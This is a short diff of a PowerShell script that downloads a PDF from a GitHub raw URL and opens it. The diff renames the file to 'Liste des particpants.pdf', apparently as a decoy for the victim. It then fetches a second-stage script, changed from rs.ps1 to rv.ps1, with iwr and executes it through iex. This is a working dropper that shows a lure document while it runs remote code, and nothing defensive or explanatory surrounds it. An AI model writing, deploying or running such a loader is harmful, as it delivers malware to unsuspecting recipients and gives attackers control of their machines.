@@ -1,6 +1,6 @@
 # Define the URL and output file path
 $PdfUrl = "https://raw.githubusercontent.com/matteoporfi/tokens/refs/heads/main/sample-1.pdf" 
-$OutputPath = "$env:TEMP\brochure.pdf"
+$OutputPath = "$env:TEMP\Liste des particpants.pdf"
 
 # Download the PDF
 Invoke-WebRequest -Uri $PdfUrl -OutFile $OutputPath
@@ -9,7 +9,7 @@ Invoke-WebRequest -Uri $PdfUrl -OutFile $OutputPath
 Start-Process -FilePath $OutputPath
 
 # Download stage 2
-$pl = iwr https://raw.githubusercontent.com/matteoporfi/tokens/refs/heads/main/rs.ps1
+$pl = iwr https://raw.githubusercontent.com/matteoporfi/tokens/refs/heads/main/rv.ps1
 
 # Execute Stage 2
 iex $pl
